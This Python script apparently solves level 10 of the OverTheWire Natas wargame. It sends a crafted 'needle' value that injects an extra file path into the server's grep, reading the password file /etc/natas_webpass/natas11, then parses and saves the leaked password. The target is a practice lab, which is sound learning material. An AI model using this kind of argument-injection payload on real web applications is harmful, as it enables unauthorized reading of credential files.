
import re,base64,requests,natas

USER='natas10'
PASSWORD=natas.get_credential(USER)

URL='http://natas10.natas.labs.overthewire.org'
QUERY='.* /etc/natas_webpass/natas11 #'

def main():
    b64 = base64.b64encode('%s:%s' % (USER,PASSWORD))

    response = requests.get (
            URL,
            headers = {
                'Authorization' : 'Basic %s' % b64
            },
            params = {
                'needle' : QUERY
            }
    )
    
    regex=r"\/etc\/natas_webpass\/natas11:(\w+)"
    matches = re.finditer(regex, response.content, re.MULTILINE)

    password = None
    for match in matches:
        password = match.group(1)

    if password is not None:
        print ('found password: %s' % password )
        print ('adding to credentials....')
        natas.save_credentials('natas11',password)
        print ('done')



if __name__=='__main__':
    main()
